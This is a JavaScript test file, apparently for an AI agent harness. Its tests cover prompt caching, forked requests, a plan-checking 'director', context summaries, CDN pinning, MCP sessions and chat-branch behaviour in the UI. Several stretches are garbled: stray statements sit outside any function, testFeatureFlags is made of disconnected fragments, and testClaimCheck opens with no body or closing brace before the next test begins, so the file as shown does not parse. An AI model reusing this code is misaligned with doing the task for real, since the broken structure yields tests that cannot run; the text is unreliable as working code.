          const cached = prepareMessages(messages, { cache: true, summary: { throughId: 200 + 5, text: "did half" } });
          const points = cached.flatMap(m => m.content).filter(b => b.cachePoint).length;
          assert(cached[0].content.at(-1).cachePoint && points === 3, `a summary is cached on its own, beside the last two turns: ${points}`);
          const history = [{ role: "assistant", modelId: "a", content: [{ reasoningContent: { reasoningText: { text: "hm", signature: "s" } } }, { toolUse: { toolUseId: "n", name: "think", input: null } }] },
            { role: "assistant", modelId: "b", content: [{ reasoningContent: { redactedContent: "lost" } }, { text: "ok" }] }];
          const [mine, theirs] = prepareMessages(history, { modelId: "a" });
          assert(mine.content[0].reasoningContent && JSON.stringify(mine.content[1].toolUse.input) === "{}", "a call without arguments goes back with an empty object");
          assert(theirs.content.length === 1 && theirs.content[0].text === "ok", "another model's reasoning is dropped");
        }

        // Why: a fork's requests start with the bytes its caller's request cached, so its question costs a cache read
        async function testForkSharesCache() {
          const big = "x".repeat(4000);
          const messages = [{ id: 1, role: "user", content: [{ text: "read the code" }] }];
          // 19 results: one more would move the stubbing step, so the fork's own result must not count
          for (let i = 0; i < 19; i++) {
            messages.push({ id: 100 + i, role: "assistant", content: [{ toolUse: { toolUseId: "t" + i, name: "view_file", input: { path: "a.html" } } }] });
            messages.push({ id: 200 + i, role: "user", content: [{ toolResult: { toolUseId: "t" + i, content: [{ json: { result: { text: big } } }] } }] });
          }
          const request = { modelId: "global.anthropic.claude-sonnet-5-5", reasoningMode: "high", systemPrompt: "P", tools: TOOLS, messages };
          const parent = getConverseCommand(request);
          const points = r => JSON.stringify(r).split('"cachePoint"').length - 1;
          assert(points(parent) <= 4, `at most four cache points: ${points(parent)}`);
          assert(parent.messages.at(-3).content.at(-1).cachePoint, "the previous request's end is marked, so its cache is read exactly");

          const turn = [{ text: "Two questions." }, ...["X", "Y"].map((q, i) => ({ toolUse: { toolUseId: "f" + i, name: "task", input: { type: "fork", prompt: `Where is ${q}?` } } }))];
          const fork = forkOf({ request, turn }, "f1", "Where is Y?");
          const child = getConverseCommand({ ...fork.request, tail: fork.messages });
          const bare = ms => JSON.stringify(ms.map(m => m.content.filter(b => !b.cachePoint)));
          assert(JSON.stringify(child.system) === JSON.stringify(parent.system) && JSON.stringify(child.toolConfig) === JSON.stringify(parent.toolConfig), "a fork has its caller's system prompt and tools");
          assert(bare(child.messages.slice(0, parent.messages.length)) === bare(parent.messages), "a fork's history is its caller's, byte for byte");
          assert(child.messages[parent.messages.length - 1].content.at(-1).cachePoint, "a fork reads from where its caller wrote");
          assert(points(child) <= 4, `a fork stays within four cache points: ${points(child)}`);
          const last = child.messages.at(-1).content, [other, own] = last.filter(b => b.toolResult).map(b => b.toolResult.content.map(c => c.text));
          assert(own[0].includes("is you") && !other[0].includes("is you"), "each fork finds which call it is");
          // Words of the user's own after the caller's calls would strip its thinking from the prefix, and the cache with it.
          assert(last.every(b => b.toolResult || b.cachePoint), `the fork's turn answers the calls and says nothing more: ${JSON.stringify(last).slice(0, 160)}`);
          assert(own[1]?.includes("Where is Y?") && !JSON.stringify(last).includes("Where is X?"), "its brief follows in its own result, and only its own question");
          assert(JSON.stringify(child.messages.at(-2).content) === JSON.stringify(turn), "the caller's turn is kept whole");
          assert(fork.toolMap.edit_file().error && fork.toolMap.task().error && fork.toolMap.view_file === viewFile, "a fork reads but does not change files or fork again");
        }

            await editFile({ patch: '<<<<<<< SEARCH\n<p id="v">good\n=======\n<p id="v">bad\n>>>>>>> REPLACE' }, context);
            const red = await test({});

            // After a change, a test check reads the run the change made rather than running the page again.

            // The names are the harness's: the model's request carries the counts.

            const [, sent] = prepareMessages([{ role: "assistant", content: [{ toolUse: { toolUseId: "w", name: "write_file", input: {} } }] }, { role: "user", content: [{ toolResult: { toolUseId: "w", content: [{ json: { result: { report } } }] } }] }]);

        // Why: an item is done when its check passes after the work, and stays done only while it keeps passing
        async function testContractRerun() {
          const threadId = await db.add("threads", { agentId: 1, name: "rerun", createdAt: Date.now() });
          const ws = await headlessProject({ "index.html": "<h1>x</h1>" });
          try {
            const context = { workspace: ws, agentId: 1, threadId };
            const director = await createDirector({ db, threadId, agentId: 1, tools: ["plan", "write_file"] });
            await director.plan({ goal: "Two notes", add: [{ title: "Notes", check: { kind: "file", file: "notes.md", contains: "alpha" } }, { title: "Todo", check: { kind: "file", file: "todo.md", contains: "beta" } }] }, context);
            // A step as the loop hands it over: the calls, then their results.
            const history = [];
            const step = async writes => {
              const calls = [], results = [];
              for (const [path, content] of writes) {
                const id = "w" + history.length + calls.length;
                await ws.exclusive(() => ws.commit(path, content));
                calls.push({ toolUse: { toolUseId: id, name: "write_file", input: { path } } });
                results.push({ toolResult: { toolUseId: id, content: [{ json: { result: { version: ws.state.project.heads[path], path, change: "+1 -0" } } }] } });
              }
              history.push({ role: "assistant", content: calls }, { role: "user", content: results });
              return director.step({ messages: history, start: 0, ws });
            };
            const items = () => director.contract.items.map(i => i.status).join(" ");
            const entries = director.contract.ledger.length;
            const other = await step([["other.md", "alpha"]]);
            assert(other.length === 0 && director.contract.ledger.length === entries, `a change to a file no check names runs no check: ${JSON.stringify(other)}`);
            const wrong = await step([["notes.md", "gamma"]]);
            assert(items() === "failing open" && eq(wrong, [`Item 1's check ran after this change and fails: notes.md doesn't contain "alpha".`]), `a change to an item's file runs its check: ${JSON.stringify(wrong)}`);
            const again = await step([["notes.md", "gamma delta"]]);
            assert(again.length === 1 && again[0].startsWith(`Item 1's check failed twice the same way (notes.md doesn't contain "alpha"), so the approach isn't working yet.`), `the same failure twice says so: ${JSON.stringify(again)}`);
            assert((await step([["notes.md", "gamma delta epsilon"]])).length === 0, "once");
            const right = await step([["notes.md", "alpha"]]);
            assert(items() === "done open" && eq(right, [`Item 1's check passed, so it is done (1 of 2 items done, 1 check green). Next: item 2, "Todo"; its check: todo.md exists and contains "beta".`]), `a passing check finishes its item and hands over the next: ${JSON.stringify(right)}`);
            // Item 2 passes as item 1 breaks: the milestone runs item 1 again, and it reopens.
            const both = await step([["notes.md", "omega"], ["todo.md", "beta"]]);
            assert(items() === "failing done", `a regression reopens its item: ${items()}`);
            assert(both[0].startsWith(`Item 1's check passed before and fails now (notes.md doesn't contain "alpha"), so the item is open again.`) && both[1].startsWith(`Item 2's check passed, so it is done (1 of 2 items done, 1 check green). Next: item 1`), JSON.stringify(both));
            assert(director.contract.ledger.some(e => e.itemId === 1 && e.after === "milestone" && e.result === "fail"), "the milestone's run is in the ledger");
            const md = ws.state.files["PLAN.md"];
            assert(md.includes("- [x] 2. Todo") && md.includes("- [ ] 1. Notes") && md.includes("1 of 2 items done"), `PLAN.md follows the checks: ${md}`);
            const all = await step([["notes.md", "alpha"]]);
            assert(all[0].includes("Every item is done: compare the work with the goal, then tell the user what was done and what wasn't, in their terms (they don't see the plan's items or checks)."), JSON.stringify(all));
          } finally {
            ws.dispose();
          }
        }

        // A turn through the loop with a contract on its thread, fake tools, and a scripted model.
        const fakeTool = (name, fn = () => ({ text: "probe ok" })) => ({ toolSpec: { name, description: "d", inputSchema: { json: { type: "object", properties: {} } } }, fn });
        const planTool = TOOLS.find(t => t.toolSpec.name === "plan");
        async function directedTurn({ script, tools = [fakeTool("probe"), planTool], contract = null, text = "go", workspace = null, history = [] }) {
          const threadId = await db.add("threads", { agentId: 1, name: "director", createdAt: Date.now(), ...(contract && { contract }) });
          const messages = [];
          for (const m of [...history, { role: "user", content: [{ text }] }]) messages.push({ ...m, id: await db.add("messages", { ...m, threadId, agentId: 1 }) });
          const [store, setStore] = createStore({ modelId: "echo", systemPrompt: "P", tools, messages });
          const sent = [];
          const mock = createMockClient(script);
          const client = { send: (input, o) => (sent.push(input), mock.send(input, o)) };
          await runAgentWithBranching(store, setStore, client, messages.at(-1).id, { threadId, agentId: 1 }, db, { workspace });
          const notes = store.messages.flatMap(m => m.content.filter(c => c.harness).map(c => c.text));
          return { store, notes, sent, thread: await db.get("threads", threadId) };
        }
        const calls = (n, name = "probe", input = {}) => Array.from({ length: n }, (_, i) => ({ blocks: mockToolUseBlock(name, input, `${name}${i}`), stopReason: "tool_use" }));
        const reply = text => ({ blocks: mockTextBlock(text) });
        const item = (id, check, status = "open") => ({ id, title: `Item ${id}`, check, status, history: [] });
        const withItems = (...items) => ({ goal: "The user's goal", done: "", assumptions: [], items, ledger: [], notes: [], questions: [] });

        // Why: the director speaks under its condition and not otherwise, and as often as its rule says
        async function testDirectorRules() {
          const GOAL = "This is long work, so the harness keeps a contract";
          const count = (notes, start) => notes.filter(n => n.startsWith(start)).length;
          // The size threshold: eight calls in a turn. A long request alone is not enough: it can be a small fix.
          assert(count((await directedTurn({ script: [...calls(9), reply("Done.")] })).notes, GOAL) === 1, "eight calls and no goal: once");
          assert(count((await directedTurn({ script: [...calls(7), reply("Done.")] })).notes, GOAL) === 0, "seven: none");
          const long = Array.from({ length: 110 }, (_, i) => "word" + i).join(" ");
          assert(count((await directedTurn({ script: [...calls(1), reply("Done.")], text: long + "." })).notes, GOAL) === 0, "a long request alone: no");
          assert(count((await directedTurn({ script: [...calls(1), reply("Done.")], text: long + "?" })).notes, GOAL) === 0, "a long question: no");
          assert(count((await directedTurn({ script: [...calls(9), reply("Done.")], contract: withItems(item(1, { kind: "source", text: "probe" })) })).notes, GOAL) === 0, "with a goal: no");
          // Goal set, no items.
          const ITEMS = "The goal is set and the plan has no items.";
          assert(count((await directedTurn({ script: [...calls(3), reply("Done.")], contract: withItems() })).notes, ITEMS) === 1, "a goal with no items: once a turn");
          assert(count((await directedTurn({ script: [...calls(3), reply("Done.")], contract: withItems(item(1, { kind: "source", text: "ok" }, "done")) })).notes, ITEMS) === 0, "with items: no");
          // Red first, in the run: the note rides after the plan's own result.
          const red = await directedTurn({ script: [...calls(1), ...calls(1, "plan", { add: { title: "Probed", check: { kind: "source", text: "probe ok" } } }), reply("Done.")], contract: withItems() });
          assert(red.notes.some(n => n.startsWith("Item 1's check already passes before any work")), `a check that already passes is flagged: ${JSON.stringify(red.notes)}`);
          // No progress in six steps.
          const STALL = "No check has passed in 6 steps, and item 1";
          const stuck = withItems(item(1, { kind: "source", text: "never seen" }));
          assert(count((await directedTurn({ script: [...calls(7), reply("Stopping: the source is down.")], contract: stuck })).notes, STALL) === 1, "six steps with no check passing: once");
          assert(count((await directedTurn({ script: [...calls(5), reply("Done.")], contract: stuck })).notes, STALL) === 0, "five: none");
          // Stopping with items open: once a turn, then the model's word stands; not when it stopped to ask.
          const OPEN = 'Item 1 is open, and the harness counts an item done only when its check passes. Continue with item 1, "Item 1" (check: "never seen" appears in a tool result), or say why the work stops here.';
          const open = await directedTurn({ script: [...calls(1), reply("Done."), reply("It needs the user.")], contract: stuck });
          assert(eq(open.notes, [OPEN]) && open.store.messages.at(-1).content[0].text === "It needs the user.", `open items are named at the stop: ${JSON.stringify(open.notes)}`);
          assert((await directedTurn({ script: [reply("Search is by tag.")], contract: stuck })).notes.length === 0, "not after a turn that only answered");
          assert((await directedTurn({ script: [...calls(1), reply("Done.")], contract: withItems(item(1, { kind: "source", text: "x" }, "done"), item(2, { kind: "judge", text: "reads well" })) })).notes.length === 0, "not when every item the harness can check is done");
          const asking = await directedTurn({ script: [...calls(1, "plan", { ask: "Which tags?" }), reply("Which tags should search use?")], contract: stuck });
          assert(!asking.notes.some(n => n.startsWith("Item 1 is open")), `nor when it stopped to ask: ${JSON.stringify(asking.notes)}`);
          // The context near the summary: write notes, once until the next summary.
          const BUDGET = "The context is at 100k tokens, near the 120k at which older messages are summarized";
          const heavy = n => Array.from({ length: n }, (_, i) => ({ blocks: [...mockToolUseBlock("probe", {}, "h" + i), { metadata: { usage: { inputTokens: 100_000 } } }], stopReason: "tool_use" }));
          const near = await directedTurn({ script: [...heavy(3), reply("Done.")] });
          assert(count(near.notes, BUDGET) === 1, `near the budget: once: ${JSON.stringify(near.notes)}`);
          assert(count((await directedTurn({ script: [...heavy(3), reply("Done.")], tools: [fakeTool("probe")] })).notes, "The context is at") === 0, "not without the plan tool to write notes with");
          // The rules are one table, each with when it is read and how often it speaks.
          assert(DIRECTOR_RULES.every(r => ["step", "stop", "summary"].includes(r.at) && ["turn", "event", "summary"].includes(r.every)), "every rule says when and how often");
          for (const id of ["polished", "goal", "silent", "failing", "untested", "unadopted"]) assert(DIRECTOR_RULES.some(r => r.id === id), `the old ${id} reminder is a rule`);
        }

        // Why: an ablation is a flag set for one eval run (eval.js --flags), not a worktree; each is a no-op at its default
        async function testFeatureFlags() {

            const open = await directedTurn({ script: [...calls(7), reply("Done.")], contract: stuck });
            assert(open.notes.length === 0, `a contract on the thread speaks no note: ${JSON.stringify(open.notes)}`);
            const eight = Array.from({ length: 8 }, (_, i) => ({ role: "assistant", content: [{ toolUse: { toolUseId: "c" + i, name: "probe", input: {} } }] }));

          assert(!systemPrompt("P", { tools: ["plan"] }).includes(AT), "no flag: not in the prompt");

        // Why: "17 passed" with no report saying so was the commonest failure on swe
        async function testClaimCheck() {

        // Why: cheap models lose the thread after a summary; the harness hands back the goal and the current item
        async function testReinjectAfterSummary() {
          const contract = { ...withItems(item(1, { kind: "file", file: "a.md" }, "done"), item(2, { kind: "file", file: "b.md", contains: "Sources" })), notes: [{ text: "b.md cites three pages", source: "https://example.com", at: 1 }] };
          const history = Array.from({ length: 10 }, (_, i) => ({ role: i % 2 ? "assistant" : "user", content: [{ text: "turn " + i }], ...(i === 9 && { usage: { inputTokens: 190_000 } }) }));
          const summarizing = { send: async input => JSON.stringify(input.messages).includes("Older messages are about to be dropped") ? createMockClient([reply("Summary: halfway.")]).send(input) : createMockClient([reply("Done.")]).send(input) };
          const threadId = await db.add("threads", { agentId: 1, name: "resummary", createdAt: Date.now(), contract });
          const messages = [];
          for (const m of [...history, { role: "user", content: [{ text: "files", harness: true }, { text: "go on" }] }]) messages.push({ ...m, id: await db.add("messages", { ...m, threadId, agentId: 1 }) });
          const userId = messages.at(-1).id;
          const [store, setStore] = createStore({ modelId: "echo", systemPrompt: "P", tools: [planTool], messages });
          const sent = [];
          await runAgentWithBranching(store, setStore, { send: (input, o) => (sent.push(input), summarizing.send(input, o)) }, userId, { threadId, agentId: 1 }, db);
          const NOTE = 'A summary replaced older messages; the contract still holds. Goal: The user\'s goal. Done: item 1. Current: item 2, "Item 2"; check: b.md exists and contains "Sources". Notes: b.md cites three pages (https://example.com).';
          const request = sent.find(r => !JSON.stringify(r.messages).includes("Older messages are about to be dropped")), last = request.messages.at(-1);
          assert(request.messages[0].content[0].text.includes("Summary: halfway."), "the request starts from the summary");
          assert(eq(last.content.filter(b => b.text).map(b => b.text), ["files", NOTE, "go on"]), `the contract comes back at the tail, before the user's words: ${JSON.stringify(last.content)}`);
          const saved = await db.get("messages", userId);
          assert(saved.content[1].text === NOTE && saved.content[1].harness, "and stays on the message, so later requests keep it");
          assert(sent.at(-1).messages.flatMap(m => m.content).filter(b => b.text?.includes("the contract still holds")).length === 1, "once per summary");
        }

        // Why: a reply that was only thought, or only blank, left a message with nothing in it, and the request was refused
        async function testEmptyMessages() {
          const thought = { reasoningContent: { reasoningText: { text: "hm", signature: "s" } } };
          const sent = prepareMessages([
            { role: "user", content: [{ text: "hi" }] },
            { role: "assistant", modelId: "other", content: [thought] },
            { role: "user", content: [{ text: "go on" }, { text: " " }] },
            { role: "assistant", modelId: "m", content: [{ text: "\n" }] },
          ], { modelId: "m", cache: true });
          assert(sent.length === 3 && JSON.stringify(sent[1].content) === '[{"text":"(empty)"}]', `a turn left with nothing in the middle says so in a word: ${JSON.stringify(sent)}`);
          assert(JSON.stringify(sent[2].content) === '[{"text":"go on"},{"cachePoint":{"type":"default"}}]', `a blank block goes, and so does a reply at the end with nothing in it: ${JSON.stringify(sent[2])}`);
          let asked;
          const client = getGeminiClient({ models: { generateContentStream: async request => { asked = request; return []; } } });
          const messages = [{ role: "user", content: [{ text: "hi" }] }, { role: "assistant", content: [{ reasoningContent: { redactedContent: new Uint8Array([1]) } }] }, { role: "user", content: [{ text: "go" }] }, { role: "assistant", content: [] }];
          for await (const _ of (await client.send({ modelId: "g", messages })).stream);
          assert(JSON.stringify(asked.contents.map(c => c.parts)) === '[[{"text":"hi"}],[{"text":"(empty)"}],[{"text":"go"}]]', `Gemini's parts keep the same rule: ${JSON.stringify(asked.contents)}`);
        }

        // Why: a CDN range moved under the app between two runs; every package loads at the version one table names
        async function testCdnPinned() {
          const exact = /^https:\/\/cdn\.jsdelivr\.net\/npm\/((?:@[^/@]+\/)?[^/@]+)@\d+\.\d+\.\d+\//;
          const map = JSON.parse(document.querySelector("script[type=importmap]").textContent).imports;
          for (const url of [...Object.values(map), ...[...document.querySelectorAll("link[rel=stylesheet]")].map(l => l.href)]) {
            const [, name] = exact.exec(url) ?? [];
            assert(name && url.startsWith(CDN[name] + "/"), `${url} is at the version engine.js pins`);
          }
          const engine = await (await fetch(new URL("engine.js", location.href))).text();
          assert(!/cdn\.jsdelivr\.net\/npm\/(?!\$\{)/.test(engine), "engine.js loads every package through its table");
        }

        // Why: a summary request that failed was asked for again before every turn, and its error went unseen
        async function testSummaryFailure() {
          const threadId = await db.add("threads", { agentId: 1, name: "summary", createdAt: Date.now() });
          const messages = Array.from({ length: 11 }, (_, i) => ({ id: 9000 + i, role: i % 2 ? "assistant" : "user", content: [{ text: "turn " + i }], ...(i === 9 && { usage: { inputTokens: 190_000 } }) }));
          let asked = 0;
          const reply = createMockClient([{ blocks: mockTextBlock("done") }]);
          const client = { send: (input, options) => JSON.stringify(input.messages).includes("Older messages are about to be dropped") ? (asked++, Promise.reject(new Error("no summary today"))) : reply.send(input, options) };
          for (let run = 0; run < 2; run++) {
            const [store, setStore] = createStore({ modelId: "echo", systemPrompt: "P", tools: [], messages: structuredClone(messages) });
            await runAgentWithBranching(store, setStore, client, messages.at(-1).id, { threadId, agentId: 1 }, db);
            assert(store.messages.at(-1).content[0]?.text === "done", `the turn goes on without a summary: ${JSON.stringify(store.messages.at(-1))}`);
          }
          assert(asked === 1 && (await db.get("threads", threadId)).summaryFailed === 9009, `a summary that failed is asked for once, and noted on the thread: ${asked}`);
        }

        // Why: a session whose initialize failed was kept, and every later call went out without one
        async function testMcpSessions() {
          const realFetch = globalThis.fetch, agentId = 9100 + Math.floor(Math.random() * 100), sent = [];
          await db.put("agents", { id: agentId, name: "mcp", systemPrompt: "", tools: ["mcp"], mcpServers: [{ name: "s", url: "https://mcp.example.com/mcp", enabled: true }], resources: [] });
          let inits = 0, lists = 0;
          globalThis.fetch = async (url, options) => {
            const { method } = JSON.parse(options.body);
            sent.push(`${method} ${new Headers(options.headers).get("mcp-session-id")}`);
            if (method === "initialize") return ++inits === 1 ? new Response("down", { status: 500 }) : Response.json({ jsonrpc: "2.0", id: 1, result: {} }, { headers: { "Mcp-Session-Id": "s" + inits } });
            if (method === "notifications/initialized") return new Response(null, { status: 202 });
            return ++lists === 1 ? new Response("gone", { status: 404 }) : Response.json({ jsonrpc: "2.0", id: 2, result: { tools: [{ name: "t" }] } });
          };
          try {
            const call = () => mcp({ command: "list_tools", server: "s" }, { db, agentId, threadId: null });
            const [down, gone, listed] = [await call(), await call(), await call()];
            assert(down.error?.startsWith("MCP 500") && gone.error?.startsWith("MCP 404") && listed.tools?.[0].name === "t", `each call says how it went: ${JSON.stringify([down, gone, listed])}`);
            assert(sent.join(", ") === "initialize null, initialize null, notifications/initialized s2, tools/list s2, initialize null, notifications/initialized s3, tools/list s3",
              `a failed initialize keeps no session, and one the server forgot starts over: ${sent.join(", ")}`);
          } finally {
            globalThis.fetch = realFetch;
            await db.delete("agents", agentId);
          }
        }

        // Why: switching files mid-edit saved the old file's text over the new one
        async function storyCodeTabSavesItsFile() {
          const ui = createTestUI();
          try {
            const ws = ui.workspace;
            await ws.createProject({ name: "Code tab" });
            await ws.commit("a.js", "const a = 1;\n");
            await ws.commit("b.js", "const b = 2;\n");
            ws.setState({ selected: "a.js", tab: "code", panel: true });
            const area = ui.container.querySelector(".code-text");
            await waitFor(() => area.value === "const a = 1;\n");
            typeInto(area, "const a = 10;\n");
            ws.setState("selected", "b.js");
            await waitFor(() => ws.state.files["a.js"] === "const a = 10;\n");
            assert(ws.state.files["b.js"] === "const b = 2;\n", `the other file is untouched: ${ws.state.files["b.js"]}`);
            assert(area.value === "const b = 2;\n", `and the editor shows it: ${area.value}`);
          } finally {
            ui.cleanup();
          }
        }

        // Why: a run on one branch streamed into a tab showing another, and its end pulled that tab onto its branch
        async function storyBranchScopedRun() {
          const a = createTestUI(), b = createTestUI();
          try {
            await a.send("first try");
            const first = a.chat.agent.messages.find(m => m.role === "user");
            await (await a.chat.sendMessage("second try", [], "echo", "off", first.id)).done;
            await b.chat.openThread(a.chat.params.threadId);
            await b.chat.switchBranch(first.id);
            const shown = () => b.chat.agent.messages.map(m => m.content.find(c => c.text)?.text ?? "").join(" | ");
            const before = shown();
            assert(before.includes("first try") && !before.includes("second try"), `the second tab shows the first branch: ${before}`);
            await a.send({ text: "A reply on the second branch, streamed in pieces so its events arrive one by one.", chunk: 40 }, { timeout: 15000 });
            assert(a.container.textContent.includes("streamed in pieces"), "the run's own tab shows its reply");
            await sleep(200);
            assert(shown() === before && !b.chat.agent.loading, `the tab on the other branch keeps its own: ${shown()}`);
          } finally {
            a.cleanup();
            b.cleanup();
          }
        }

        // Why: a reply on an older branch ended on the newest one, since the chat reopened at its most recent root
        async function storyReplyStaysOnItsBranch() {
          const ui = createTestUI();
          try {
            await ui.send("first try");
            const first = ui.chat.agent.messages.find(m => m.role === "user");
            await (await ui.chat.sendMessage("second try", [], "echo", "off", first.id)).done;
            await ui.chat.switchBranch(first.id);
            await ui.send("more on the first");
            const shown = () => ui.chat.agent.messages.map(m => m.content.find(c => c.text)?.text ?? "").join(" | ");
            assert(shown().startsWith("first try") && shown().includes("more on the first") && !shown().includes("second try"), `the reply stays on its branch: ${shown()}`);
            await ui.chat.openThread(ui.chat.params.threadId);
            assert(shown().includes("more on the first") && !shown().includes("second try"), `and the chat opens there again: ${shown()}`);
          } finally {
            ui.cleanup();
          }
        }

        // Why: an edit of the first message streamed from the chat's first message on, so every tab took it, whatever it showed
        async function storyFirstMessageEditScoped() {
          const a = createTestUI(), b = createTestUI();
          try {
            await a.send("first try");
            const first = a.chat.agent.messages.find(m => m.role === "user");
            await b.chat.openThread(a.chat.params.threadId);
            const shown = () => b.chat.agent.messages.map(m => m.content.find(c => c.text)?.text ?? "").join(" | ");
            const before = shown();
            let strayed = false;
            const watch = setInterval(() => { strayed ||= shown() !== before || b.chat.agent.loading; }, 10);
            try {
              const edit = await a.chat.sendMessage(JSON.stringify({ text: "An edit of the first message, streamed in pieces so its events arrive one by one.", chunk: 40 }), [], "echo", "off", first.id);
              await edit.done;
              await sleep(200);
            } finally {
              clearInterval(watch);
            }
            assert(a.container.textContent.includes("streamed in pieces"), "the editing tab shows the edit");
            assert(!strayed && shown() === before, `the tab on the first message's other branch keeps its own throughout: ${shown()}`);
          } finally {
            a.cleanup();
            b.cleanup();
          }
        }
